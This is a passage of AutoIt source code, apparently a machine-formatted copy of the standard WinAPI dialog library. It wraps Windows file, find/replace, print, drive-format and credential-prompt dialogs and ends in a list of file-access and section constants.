                Return SetError($acall[0x0], 0x0, "The lStructSize member of the initialization structure for the corresponding common dialog box is invalid")
            Case $FNERR_BUFFERTOOSMALL
                Return SetError($acall[0x0], 0x0, "The buffer pointed to by the lpstrFile member of the OPENFILENAME structure is too small for the file name specified by the user." & @LF & "The first two bytes of the lpstrFile buffer contain an integer value specifying the size, in TCHARs, required to receive the full name.")
            Case $FNERR_INVALIDFILENAME
                Return SetError($acall[0x0], 0x0, "A file name is invalid.")
            Case $FNERR_SUBCLASSFAILURE
                Return SetError($acall[0x0], 0x0, "An attempt to subclass a list box failed because sufficient memory was not available.")
            EndSwitch
        EndIf
        Return SetError(@error, @extended, "0x" & Hex($acall[0x0]))
    EndFunc    ; -> _WinAPI_CommDlgExtendedError

    Func _WinAPI_CommDlgExtendedErrorEx()
        Local $acall = DllCall("comdlg32.dll", "dword", "CommDlgExtendedError")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CommDlgExtendedErrorEx

    Func _WinAPI_ConfirmCredentials($starget, $bconfirm)
        If Not __dll("credui.dll") Then Return SetError(0x67, 0x0, 0x0)
        Local $acall = DllCall("credui.dll", "dword", "CredUIConfirmCredentialsW", "wstr", $starget, "bool", $bconfirm)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ConfirmCredentials

    Func _WinAPI_FindTextDlg($howner, $sfindwhat = '', $iflags = 0x0, $pfindproc = 0x0, $lparam = 0x0)
        $__g_pfrbuffer = __HeapReAlloc($__g_pfrbuffer, 0x2 * $__g_ifrbuffersize)
        If @error Then Return SetError(@error + 0x14, @extended, 0x0)
        DllStructSetData(DllStructCreate("wchar[" & $__g_ifrbuffersize & "]", $__g_pfrbuffer), 0x1, StringLeft($sfindwhat, $__g_ifrbuffersize + -1))
        Local $tfr = DllStructCreate($TAGFINDREPLACE)
        DllStructSetData($tfr, "Size", DllStructGetSize($tfr))
        DllStructSetData($tfr, "hOwner", $howner)
        DllStructSetData($tfr, "hInstance", 0x0)
        DllStructSetData($tfr, "Flags", $iflags)
        DllStructSetData($tfr, "FindWhat", $__g_pfrbuffer)
        DllStructSetData($tfr, "ReplaceWith", 0x0)
        DllStructSetData($tfr, "FindWhatLen", $__g_ifrbuffersize * 0x2)
        DllStructSetData($tfr, "ReplaceWithLen", 0x0)
        DllStructSetData($tfr, "lParam", $lparam)
        DllStructSetData($tfr, "Hook", $pfindproc)
        DllStructSetData($tfr, "TemplateName", 0x0)
        Local $acall = DllCall("comdlg32.dll", "hwnd", "FindTextW", "struct*", $tfr)
        If @error Or Not $acall[0x0] Then
            Local $ierror = @error + 0x1e
            __HeapFree($__g_pfrbuffer)
            If IsArray($acall) Then
                Return SetError(0xa, _WinAPI_CommDlgExtendedErrorEx(), 0x0)
            Else
                Return SetError($ierror, @extended, 0x0)
            EndIf
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindTextDlg

    Func _WinAPI_FlushFRBuffer()
        If Not __HeapFree($__g_pfrbuffer, 0x1) Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_FlushFRBuffer

    Func _WinAPI_FormatDriveDlg($sdrive, $ioption = 0x0, $hparent = 0x0)
        If Not IsString($sdrive) Then Return SetError(0xa, 0x0, 0x0)
        $sdrive = StringLeft(StringUpper(StringStripWS($sdrive, $STR_STRIPLEADING)), 0x1)
        If Not $sdrive Then Return SetError(0xb, 0x0, 0x0)
        $sdrive = Asc($sdrive) + -65
        If ($sdrive < 0x0) Or ($sdrive > 0x19) Then Return SetError(0xc, 0x0, 0x0)
        Local $acall = DllCall("shell32.dll", "dword", "SHFormatDrive", "hwnd", $hparent, "uint", $sdrive, "uint", 0xffff, "uint", $ioption)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] < 0x0 Then Return SetError($acall[0x0], 0x0, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FormatDriveDlg

    Func _WinAPI_GetConnectedDlg($idlg, $iflags = 0x0, $hparent = 0x0)
        If Not __dll("connect.dll") Then Return SetError(0x67, 0x0, 0x0)
        Switch $idlg
        Case 0x0
            $idlg = "GetNetworkConnected"
        Case 0x1
            $idlg = "GetInternetConnected"
        Case 0x2
            $idlg = "GetVPNConnected"
        Case Else
            Return SetError(0x1, 0x0, 0x0)
        EndSwitch
        Local $sstr = ''
        If BitAND($iflags, 0x1) Then
            $sstr &= "-SkipInternetDetection "
        EndIf
        If BitAND($iflags, 0x2) Then
            $sstr &= "-SkipExistingConnections "
        EndIf
        If BitAND($iflags, 0x4) Then
            $sstr &= "-HideFinishPage "
        EndIf
        Local $acall = DllCall("connect.dll", "long", $idlg, "hwnd", $hparent, "dword", 0x0, "dword", 0x0, "dword", 0x0, "handle", 0x0, "wstr", StringStripWS($sstr, $STR_STRIPTRAILING))
        If @error Then Return SetError(@error, @extended, 0x0)
        If Not ($acall[0x0] = 0x0 Or $acall[0x0] = 0x1) Then Return SetError(0xa, $acall[0x0], 0x0)
        Return Number(Not $acall[0x0])
    EndFunc    ; -> _WinAPI_GetConnectedDlg

    Func _WinAPI_GetFRBuffer()
        Return $__g_ifrbuffersize + -1
    EndFunc    ; -> _WinAPI_GetFRBuffer

    Func _WinAPI_GetOpenFileName($stitle = '', $sfilter = "All files (*.*)", $sinitaldir = ".", $sdefaultfile = '', $sdefaultext = '', $ifilterindex = 0x1, $iflags = 0x0, $iflagsex = 0x0, $hwndowner = 0x0)
        Local $vresult = __OFNDlg(0x0, $stitle, $sinitaldir, $sfilter, $ifilterindex, $sdefaultfile, $sdefaultext, $iflags, $iflagsex, 0x0, 0x0, $hwndowner)
        If @error Then Return SetError(@error, @extended, $vresult)
        If BitAND($iflags, $OFN_ALLOWMULTISELECT) Then
            Return __WinAPI_ParseMultiSelectFileDialogPath($vresult)
        Else
            Return __WinAPI_ParseFileDialogPath($vresult)
        EndIf
    EndFunc    ; -> _WinAPI_GetOpenFileName

    Func _WinAPI_GetSaveFileName($stitle = '', $sfilter = "All files (*.*)", $sinitaldir = ".", $sdefaultfile = '', $sdefaultext = '', $ifilterindex = 0x1, $iflags = 0x0, $iflagsex = 0x0, $hwndowner = 0x0)
        Local $vreturn = __OFNDlg(0x1, $stitle, $sinitaldir, $sfilter, $ifilterindex, $sdefaultfile, $sdefaultext, $iflags, $iflagsex, 0x0, 0x0, $hwndowner)
        If @error Then Return SetError(@error, @extended, $vreturn)
        Return __WinAPI_ParseFileDialogPath($vreturn)
    EndFunc    ; -> _WinAPI_GetSaveFileName

    Func _WinAPI_MessageBoxCheck($itype, $stitle, $stext, $sregval, $idefault = + -1, $hparent = 0x0)
        Local $acall = DllCall("shlwapi.dll", "int", "SHMessageBoxCheckW", "hwnd", $hparent, "wstr", $stext, "wstr", $stitle, "uint", $itype, "int", $idefault, "wstr", $sregval)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MessageBoxCheck

    Func _WinAPI_MessageBoxIndirect($tmsgboxparams)
        Local $acall = DllCall("user32.dll", "int", "MessageBoxIndirectW", "struct*", $tmsgboxparams)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MessageBoxIndirect

    Func _WinAPI_OpenFileDlg($stitle = '', $sinitdir = '', $sfilters = '', $idefaultfilter = 0x0, $sdefaultfilepath = '', $sdefaultext = '', $iflags = 0x0, $iflagsex = 0x0, $pofnproc = 0x0, $pdata = 0x0, $hparent = 0x0)
        Local $vresult = __OFNDlg(0x0, $stitle, $sinitdir, $sfilters, $idefaultfilter, $sdefaultfilepath, $sdefaultext, $iflags, $iflagsex, $pofnproc, $pdata, $hparent)
        If @error Then Return SetError(@error, @extended, $vresult)
        Return $vresult
    EndFunc    ; -> _WinAPI_OpenFileDlg

    Func _WinAPI_PageSetupDlg(ByRef $tpagesetupdlg)
        Local $acall = DllCall("comdlg32.dll", "int", "PageSetupDlgW", "struct*", $tpagesetupdlg)
        If @error Then Return SetError(@error, @extended, 0x0)
        If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_CommDlgExtendedErrorEx(), 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PageSetupDlg

    Func _WinAPI_PickIconDlg($sicon = '', $iindex = 0x0, $hparent = 0x0)
        Local $acall = DllCall("shell32.dll", "int", "PickIconDlg", "hwnd", $hparent, "wstr", $sicon, "int", 0x1000, "int*", $iindex)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0x2]
        Local $ares = DllCall("kernel32.dll", "dword", "ExpandEnvironmentStringsW", "wstr", $acall[0x2], "wstr", '', "dword", 0x1000)
        $aret[0x0] = $ares[0x2]
        $aret[0x1] = $acall[0x4]
        Return $aret
    EndFunc    ; -> _WinAPI_PickIconDlg

    Func _WinAPI_PrintDlg(ByRef $tprintdlg)
        Local $acall = DllCall("comdlg32.dll", "long", "PrintDlgW", "struct*", $tprintdlg)
        If @error Then Return SetError(@error, @extended, 0x0)
        If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_CommDlgExtendedErrorEx(), 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PrintDlg

    Func _WinAPI_PrintDlgEx(ByRef $tprintdlgex)
        Local $tpdex = DllStructCreate($TAGPRINTDLGEX, DllStructGetPtr($tprintdlgex))
        Local $acall = DllCall("comdlg32.dll", "long", "PrintDlgExW", "struct*", $tpdex)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return SetExtended(DllStructGetData($tpdex, "ResultAction"), 0x1)
    EndFunc    ; -> _WinAPI_PrintDlgEx

    Func _WinAPI_ReplaceTextDlg($howner, $sfindwhat = '', $sreplacewith = '', $iflags = 0x0, $preplaceproc = 0x0, $lparam = 0x0)
        $__g_pfrbuffer = __HeapReAlloc($__g_pfrbuffer, 0x4 * $__g_ifrbuffersize)
        If @error Then Return SetError(@error + 0x64, @extended, 0x0)
        Local $tbuff = DllStructCreate("wchar[" & $__g_ifrbuffersize & "];wchar[" & $__g_ifrbuffersize & "]", $__g_pfrbuffer)
        DllStructSetData($tbuff, 0x1, StringLeft($sfindwhat, $__g_ifrbuffersize + -1))
        DllStructSetData($tbuff, 0x2, StringLeft($sreplacewith, $__g_ifrbuffersize + -1))
        Local $tfr = DllStructCreate($TAGFINDREPLACE)
        DllStructSetData($tfr, "Size", DllStructGetSize($tfr))
        DllStructSetData($tfr, "hOwner", $howner)
        DllStructSetData($tfr, "hInstance", 0x0)
        DllStructSetData($tfr, "Flags", $iflags)
        DllStructSetData($tfr, "FindWhat", DllStructGetPtr($tbuff, 0x1))
        DllStructSetData($tfr, "ReplaceWith", DllStructGetPtr($tbuff, 0x2))
        DllStructSetData($tfr, "FindWhatLen", $__g_ifrbuffersize * 0x2)
        DllStructSetData($tfr, "ReplaceWithLen", $__g_ifrbuffersize * 0x2)
        DllStructSetData($tfr, "lParam", $lparam)
        DllStructSetData($tfr, "Hook", $preplaceproc)
        DllStructSetData($tfr, "TemplateName", 0x0)
        Local $acall = DllCall("comdlg32.dll", "hwnd", "ReplaceTextW", "struct*", $tfr)
        If @error Or Not $acall[0x0] Then
            Local $ierror = @error
            __HeapFree($__g_pfrbuffer)
            If IsArray($acall) Then
                Return SetError(0xa, _WinAPI_CommDlgExtendedErrorEx(), 0x0)
            Else
                Return SetError($ierror, 0x0, 0x0)
            EndIf
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ReplaceTextDlg

    Func _WinAPI_RestartDlg($stext = '', $iflags = 0x2, $hparent = 0x0)
        Local $acall = DllCall("shell32.dll", "int", "RestartDialog", "hwnd", $hparent, "wstr", $stext, "int", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RestartDlg

    Func _WinAPI_SaveFileDlg($stitle = '', $sinitdir = '', $sfilters = '', $idefaultfilter = 0x0, $sdefaultfilepath = '', $sdefaultext = '', $iflags = 0x0, $iflagsex = 0x0, $pofnproc = 0x0, $pdata = 0x0, $hparent = 0x0)
        Local $vresult = __OFNDlg(0x1, $stitle, $sinitdir, $sfilters, $idefaultfilter, $sdefaultfilepath, $sdefaultext, $iflags, $iflagsex, $pofnproc, $pdata, $hparent)
        If @error Then Return SetError(@error, @extended, $vresult)
        Return $vresult
    EndFunc    ; -> _WinAPI_SaveFileDlg

    Func _WinAPI_SetFRBuffer($ichars)
        $ichars = Number($ichars)
        If $ichars < 0x50 Then
            $ichars = 0x50
        EndIf
        $__g_ifrbuffersize = $ichars + 0x1
        Return 0x1
    EndFunc    ; -> _WinAPI_SetFRBuffer

    Func _WinAPI_ShellAboutDlg($stitle, $sname, $stext, $hicon = 0x0, $hparent = 0x0)
        Local $acall = DllCall("shell32.dll", "int", "ShellAboutW", "hwnd", $hparent, "wstr", $stitle & "#" & $sname, "wstr", $stext, "handle", $hicon)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShellAboutDlg

    Func _WinAPI_ShellOpenWithDlg($sfilepath, $iflags = 0x0, $hparent = 0x0)
        Local $topenasinfo = DllStructCreate("ptr;ptr;dword;wchar[" & (StringLen($sfilepath) + 0x1) & "]")
        DllStructSetData($topenasinfo, 0x1, DllStructGetPtr($topenasinfo, 0x4))
        DllStructSetData($topenasinfo, 0x2, 0x0)
        DllStructSetData($topenasinfo, 0x3, $iflags)
        DllStructSetData($topenasinfo, 0x4, $sfilepath)
        Local $acall = DllCall("shell32.dll", "long", "SHOpenWithDialog", "hwnd", $hparent, "struct*", $topenasinfo)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellOpenWithDlg

    Func _WinAPI_ShellStartNetConnectionDlg($sremote = '', $iflags = 0x0, $hparent = 0x0)
        If Not StringStripWS($sremote, $STR_STRIPLEADING + $STR_STRIPTRAILING) Then $sremote = Null
        DllCall("shell32.dll", "long", "SHStartNetConnectionDialogW", "hwnd", $hparent, "wstr", $sremote, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_ShellStartNetConnectionDlg

    Func _WinAPI_ShellUserAuthenticationDlg($scaption, $smessage, $suser, $spassword, $starget, $iflags = 0x0, $ierror = 0x0, $bsave = False, $hbitmap = 0x0, $hparent = 0x0)
        If Not __dll("credui.dll") Then Return SetError(0x67, 0x0, 0x0)
        Local $tinfo = DllStructCreate("dword;hwnd;ptr;ptr;ptr;wchar[" & (StringLen($smessage) + 0x1) & "];wchar[" & (StringLen($scaption) + 0x1) & "]")
        DllStructSetData($tinfo, 0x1, DllStructGetPtr($tinfo, 0x6) - DllStructGetPtr($tinfo))
        DllStructSetData($tinfo, 0x2, $hparent)
        DllStructSetData($tinfo, 0x3, DllStructGetPtr($tinfo, 0x6))
        DllStructSetData($tinfo, 0x4, DllStructGetPtr($tinfo, 0x7))
        DllStructSetData($tinfo, 0x5, $hbitmap)
        DllStructSetData($tinfo, 0x6, $smessage)
        DllStructSetData($tinfo, 0x7, $scaption)
        Local $acall = DllCall("credui.dll", "dword", "CredUIPromptForCredentialsW", "struct*", $tinfo, "wstr", $starget, "ptr", 0x0, "dword", $ierror, "wstr", $suser, "ulong", 0x1000, "wstr", $spassword, "ulong", 0x1000, "bool*", $bsave, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Local $aret[0x3]
        $aret[0x0] = $acall[0x5]
        $aret[0x1] = $acall[0x7]
        $aret[0x2] = $acall[0x9]
        Return $aret
    EndFunc    ; -> _WinAPI_ShellUserAuthenticationDlg

    Func _WinAPI_ShellUserAuthenticationDlgEx($scaption, $smessage, $suser, $spassword, $iflags = 0x0, $iautherror = 0x0, $bsave = False, $ipackage = 0x0, $hparent = 0x0)
        If Not __dll("credui.dll") Then Return SetError(0x67, 0x0, 0x0)
        Local $tblob = 0x0, $acall
        If StringLen($suser) Then
            $acall = DllCall("credui.dll", "bool", "CredPackAuthenticationBufferW", "dword", 0x1, "wstr", $suser, "wstr", $spassword, "ptr", 0x0, "dword*", 0x0)
            If @error Or Not $acall[0x5] Then Return SetError(@error + 0xa, @extended, 0x0)
            $tblob = DllStructCreate("byte[" & $acall[0x5] & "]")
            $acall = DllCall("credui.dll", "bool", "CredPackAuthenticationBufferW", "dword", 0x1, "wstr", $suser, "wstr", $spassword, "struct*", $tblob, "dword*", $acall[0x5])
            If @error Or Not $acall[0x0] Then Return SetError(@error + 0x14, @extended, 0x0)
        EndIf
        Local $tinfo = DllStructCreate("dword;hwnd;ptr;ptr;ptr;wchar[" & (StringLen($smessage) + 0x1) & "];wchar[" & (StringLen($scaption) + 0x1) & "]")
        DllStructSetData($tinfo, 0x1, DllStructGetPtr($tinfo, 0x6) - DllStructGetPtr($tinfo))
        DllStructSetData($tinfo, 0x2, $hparent)
        DllStructSetData($tinfo, 0x3, DllStructGetPtr($tinfo, 0x6))
        DllStructSetData($tinfo, 0x4, DllStructGetPtr($tinfo, 0x7))
        DllStructSetData($tinfo, 0x5, 0x0)
        DllStructSetData($tinfo, 0x6, $smessage)
        DllStructSetData($tinfo, 0x7, $scaption)
        $acall = DllCall("credui.dll", "dword", "CredUIPromptForWindowsCredentialsW", "struct*", $tinfo, "dword", $iautherror, "ulong*", $ipackage, "struct*", $tblob, "ulong", DllStructGetSize($tblob), "ptr*", 0x0, "ulong*", 0x0, "bool*", $bsave, "dword", $iflags)
        If @error Then Return SetError(@error + 0x1e, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0x1e, $acall[0x0], 0x0)
        Local $aret[0x4], $ierror = 0x0
        $aret[0x2] = $acall[0x8]
        $aret[0x3] = $acall[0x3]
        Local $pblob = $acall[0x6]
        Local $isize = $acall[0x7]
        $acall = DllCall("credui.dll", "bool", "CredUnPackAuthenticationBufferW", "dword", 0x1, "ptr", $pblob, "dword", $isize, "wstr", '', "dword*", 0x1000, "wstr", '', "dword*", 0x1000, "wstr", '', "dword*", 0x1000)
        If Not @error And $acall[0x0] Then
            $aret[0x0] = $acall[0x4]
            $aret[0x1] = $acall[0x8]
        Else
            $ierror = @error + 0x28
        EndIf
        If Not _WinAPI_ZeroMemory($pblob, $isize) Then
        EndIf
        _WinAPI_CoTaskMemFree($pblob)
        If $ierror Then Return SetError($ierror, 0x0, 0x0)
        Return $aret
    EndFunc    ; -> _WinAPI_ShellUserAuthenticationDlgEx

#EndRegion Public Functions
#Region Internal Functions
    Func __OFNDlg($idlg, $stitle, $sinitdir, $sfilters, $ideffilter, $sdeffile, $sdefext, $iflags, $iflagsex, $pofnproc, $pdata, $hparent)
        Local $verror[0x1] = [0x0]
        If BitAND($iflags, $OFN_ALLOWMULTISELECT) = 0x0 Then $verror = ''
        Local $tbuffer = DllStructCreate("wchar[32768]")
        Local $tfilters = 0x0, $tdefext = 0x0, $tinitdir = 0x0, $ttitle = 0x0
        Local $tofn = DllStructCreate($TAGOPENFILENAME)
        DllStructSetData($tofn, "StructSize", DllStructGetSize($tofn))
        DllStructSetData($tofn, "hwndOwner", $hparent)
        DllStructSetData($tofn, 0x3, 0x0)
        Local $ADATA = StringSplit($sfilters, "|")
        Local $afilters[$ADATA[0x0] * 0x2]
        Local $icount = 0x0
        For $i = 0x1 To $ADATA[0x0]
            $afilters[$icount + 0x0] = StringStripWS($ADATA[$i], $STR_STRIPLEADING + $STR_STRIPTRAILING)
            $afilters[$icount + 0x1] = StringStripWS(StringRegExpReplace($ADATA[$i], ".*\\((.*)\\)", "\\1"), $STR_STRIPALL)
            If $afilters[$icount + 0x1] Then
                $icount += 0x2
            EndIf
        Next
        If $icount Then
            $tfilters = _WinAPI_ArrayToStruct($afilters, 0x0, $icount + -1)
            If @error Then
            EndIf
        EndIf
        DllStructSetData($tofn, "lpstrFilter", DllStructGetPtr($tfilters))
        DllStructSetData($tofn, 0x5, 0x0)
        DllStructSetData($tofn, 0x6, 0x0)
        DllStructSetData($tofn, "nFilterIndex", $ideffilter)
        $sdeffile = StringStripWS($sdeffile, $STR_STRIPLEADING + $STR_STRIPTRAILING)
        If $sdeffile Then
            DllStructSetData($tbuffer, 0x1, $sdeffile)
        EndIf
        DllStructSetData($tofn, "lpstrFile", DllStructGetPtr($tbuffer))
        DllStructSetData($tofn, "nMaxFile", 0x8000)
        DllStructSetData($tofn, 0xa, 0x0)
        DllStructSetData($tofn, 0xb, 0x0)
        $sinitdir = StringStripWS($sinitdir, $STR_STRIPLEADING + $STR_STRIPTRAILING)
        If $sinitdir Then
            $tinitdir = DllStructCreate("wchar[" & (StringLen($sinitdir) + 0x1) & "]")
        EndIf
        DllStructSetData($tinitdir, 0x1, $sinitdir)
        DllStructSetData($tofn, "lpstrInitialDir", DllStructGetPtr($tinitdir))
        $stitle = StringStripWS($stitle, $STR_STRIPLEADING + $STR_STRIPTRAILING)
        If $stitle Then
            $ttitle = DllStructCreate("wchar[" & (StringLen($stitle) + 0x1) & "]")
        EndIf
        DllStructSetData($ttitle, 0x1, $stitle)
        DllStructSetData($tofn, "lpstrTitle", DllStructGetPtr($ttitle))
        DllStructSetData($tofn, "Flags", $iflags)
        DllStructSetData($tofn, 0xf, 0x0)
        DllStructSetData($tofn, 0x10, 0x0)
        $sdefext = StringStripWS($sdefext, $STR_STRIPLEADING + $STR_STRIPTRAILING)
        If $sdefext Then
            $tdefext = DllStructCreate("wchar[" & (StringLen($tdefext) + 0x1) & "]")
        EndIf
        DllStructSetData($tdefext, 0x1, StringReplace($sdefext, ".", ''))
        DllStructSetData($tofn, "lpstrDefExt", DllStructGetPtr($tdefext))
        DllStructSetData($tofn, "lCustData", $pdata)
        DllStructSetData($tofn, "lpfnHook", $pofnproc)
        DllStructSetData($tofn, 0x14, 0x0)
        DllStructSetData($tofn, 0x15, 0x0)
        DllStructSetData($tofn, 0x16, 0x0)
        DllStructSetData($tofn, "FlagsEx", $iflagsex)
        Local $acall
        Switch $idlg
        Case 0x0
            $acall = DllCall("comdlg32.dll", "bool", "GetOpenFileNameW", "struct*", $tofn)
        Case 0x1
            $acall = DllCall("comdlg32.dll", "bool", "GetSaveFileNameW", "struct*", $tofn)
        Case Else
        EndSwitch
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, _WinAPI_CommDlgExtendedErrorEx(), $verror)
        If BitAND($iflags, $OFN_ALLOWMULTISELECT) Then
            If BitAND($iflags, $OFN_EXPLORER) Then
                $ADATA = _WinAPI_StructToArray($tbuffer)
                If @error Then
                    Return SetError(0xb, 0x0, $verror)
                EndIf
            Else
                $ADATA = StringSplit(DllStructGetData($tbuffer, 0x1), " ")
            EndIf
            Switch $ADATA[0x0]
            Case 0x0
                Return SetError(0xc, 0x0, $verror)
            Case 0x1
            Case Else
                Local $spath = $ADATA[0x1]
                For $i = 0x2 To $ADATA[0x0]
                    $ADATA[$i + -1] = _WinAPI_PathAppend($spath, $ADATA[$i])
                Next
                ReDim $ADATA[$ADATA[0x0]]
                $ADATA[0x0]-= 0x1
            EndSwitch
        Else
            $ADATA = DllStructGetData($tbuffer, 0x1)
        EndIf
        $__g_vext = $tofn
        Return $ADATA
    EndFunc    ; -> __OFNDlg

    Func __WinAPI_ParseMultiSelectFileDialogPath($apath)
        Local $afiles[UBound($apath) + 0x1]
        $afiles[0x0] = UBound($apath)
        $afiles[0x1] = StringMid($apath[0x1], 0x1, StringInStr($apath[0x1], "\\", $STR_NOCASESENSEBASIC, + -1) + -1)
        For $i = 0x1 To UBound($apath) + -1
            $afiles[$i + 0x1] = StringMid($apath[$i], StringInStr($apath[$i], "\\", $STR_NOCASESENSEBASIC, + -1) + 0x1)
        Next
        Return $afiles
    EndFunc    ; -> __WinAPI_ParseMultiSelectFileDialogPath

    Func __WinAPI_ParseFileDialogPath($spath)
        Local $afiles[0x3]
        $afiles[0x0] = 0x2
        $afiles[0x1] = StringMid($spath, 0x1, StringInStr($spath, "\\", $STR_NOCASESENSEBASIC, + -1) + -1)
        $afiles[0x2] = StringMid($spath, StringInStr($spath, "\\", $STR_NOCASESENSEBASIC, + -1) + 0x1)
        Return $afiles
    EndFunc    ; -> __WinAPI_ParseFileDialogPath

#EndRegion Internal Functions
Global Const $BACKUP_ALTERNATE_DATA = 0x4
Global Const $BACKUP_DATA = 0x1
Global Const $BACKUP_EA_DATA = 0x2
Global Const $BACKUP_LINK = 0x5
Global Const $BACKUP_OBJECT_ID = 0x7
Global Const $BACKUP_PROPERTY_DATA = 0x6
Global Const $BACKUP_REPARSE_DATA = 0x8
Global Const $BACKUP_SECURITY_DATA = 0x3
Global Const $BACKUP_SPARSE_BLOCK = 0x9
Global Const $BACKUP_TXFS_DATA = 0xa
Global Const $COPY_FILE_ALLOW_DECRYPTED_DESTINATION = 0x8
Global Const $COPY_FILE_COPY_SYMLINK = 0x800
Global Const $COPY_FILE_FAIL_IF_EXISTS = 0x1
Global Const $COPY_FILE_NO_BUFFERING = 0x1000
Global Const $COPY_FILE_OPEN_SOURCE_FOR_WRITE = 0x4
Global Const $COPY_FILE_RESTARTABLE = 0x2
Global Const $MOVE_FILE_COPY_ALLOWED = 0x2
Global Const $MOVE_FILE_CREATE_HARDLINK = 0x10
Global Const $MOVE_FILE_DELAY_UNTIL_REBOOT = 0x4
Global Const $MOVE_FILE_FAIL_IF_NOT_TRACKABLE = 0x20
Global Const $MOVE_FILE_REPLACE_EXISTING = 0x1
Global Const $MOVE_FILE_WRITE_THROUGH = 0x8
Global Const $PROGRESS_CONTINUE = 0x0
Global Const $PROGRESS_CANCEL = 0x1
Global Const $PROGRESS_STOP = 0x2
Global Const $PROGRESS_QUIET = 0x3
Global Const $FILE_APPEND_DATA = 0x4
Global Const $FILE_DELETE_CHILD = 0x40
Global Const $FILE_EXECUTE = 0x20
Global Const $FILE_READ_ATTRIBUTES = 0x80
Global Const $FILE_READ_DATA = 0x1
Global Const $FILE_READ_EA = 0x8
Global Const $FILE_WRITE_ATTRIBUTES = 0x100
Global Const $FILE_WRITE_DATA = 0x2
Global Const $FILE_WRITE_EA = 0x10
Global Const $FILE_ADD_FILE = $FILE_WRITE_DATA
Global Const $FILE_ADD_SUBDIRECTORY = $FILE_APPEND_DATA
Global Const $FILE_CREATE_PIPE_INSTANCE = $FILE_APPEND_DATA
Global Const $FILE_LIST_DIRECTORY = $FILE_READ_DATA
Global Const $FILE_TRAVERSE = $FILE_EXECUTE
Global Const $FILE_ALL_ACCESS = 0x1f01ff
Global Const $FILE_FLAG_BACKUP_SEMANTICS = 0x2000000
Global Const $FILE_FLAG_DELETE_ON_CLOSE = 0x4000000
Global Const $FILE_FLAG_NO_BUFFERING = 0x20000000
Global Const $FILE_FLAG_OPEN_NO_RECALL = 0x100000
Global Const $FILE_FLAG_OPEN_REPARSE_POINT = 0x200000
Global Const $FILE_FLAG_OVERLAPPED = 0x40000000
Global Const $FILE_FLAG_POSIX_SEMANTICS = 0x100000
Global Const $FILE_FLAG_RANDOM_ACCESS = 0x10000000
Global Const $FILE_FLAG_SEQUENTIAL_SCAN = 0x8000000
Global Const $FILE_FLAG_WRITE_THROUGH = -2147483648
Global Const $SECURITY_ANONYMOUS = 0x0
Global Const $SECURITY_CONTEXT_TRACKING = 0x40000
Global Const $SECURITY_DELEGATION = 0x30000
Global Const $SECURITY_EFFECTIVE_ONLY = 0x80000
Global Const $SECURITY_IDENTIFICATION = 0x10000
Global Const $SECURITY_IMPERSONATION = 0x20000
Global Const $SEC_COMMIT = 0x8000000
Global Const $SEC_IMAGE = 0x1000000
Global Const $SEC_LARGE_PAGES = -2147483648
Global Const $SEC_NOCACHE = 0x10000000
Global Const $SEC_RESERVE = 0x4000000
Global Const $SEC_WRITECOMBINE = 0x40000000
Global Const $SECTION_EXTEND_SIZE = 0x10
Global Const $SECTION_MAP_EXECUTE = 0x8
Global Const $SECTION_MAP_READ = 0x4
Global Const $SECTION_MAP_WRITE = 0x2
Global Const $SECTION_QUERY = 0x1
Global Const $SECTION_ALL_ACCESS = 0x1f001f
Global Const $FILE_MAP_COPY = 0x1
Global Const $FILE_MAP_EXECUTE = 0x20
Global Const $FILE_MAP_READ = 0x4
Global Const $FILE_MAP_WRITE = 0x2
Global Const $FILE_MAP_ALL_ACCESS = $SECTION_ALL_ACCESS
Global Const $DDD_EXACT_MATCH_ON_REMOVE = 0x4
Global Const $DDD_NO_BROADCAST_SYSTEM = 0x8
Global Const $DDD_RAW_TARGET_PATH = 0x1
Global Const $DDD_REMOVE_DEFINITION = 0x2
Global Const $FSCTL_ALLOW_EXTENDED_DASD_IO = 0x90083
Global Const $FSCTL_CREATE_OR_GET_OBJECT_ID = 0x900c0
Global Const $FSCTL_CREATE_USN_JOURNAL = 0x900e7
Global Const $FSCTL_DELETE_OBJECT_ID = 0x900a0
Global Const $FSCTL_DELETE_REPARSE_POINT = 0x900ac
Global Const $FSCTL_DELETE_USN_JOURNAL = 0x900f8
Global Const $FSCTL_DISMOUNT_VOLUME = 0x90020
Global Const $FSCTL_DUMP_PROPERTY_DATA = 0x90097
Global Const $FSCTL_ENABLE_UPGRADE = 0x980d0
Global Const $FSCTL_ENCRYPTION_FSCTL_IO = 0x900db
Global Const $FSCTL_ENUM_USN_DATA = 0x900b3
Global Const $FSCTL_EXTEND_VOLUME = 0x900f0
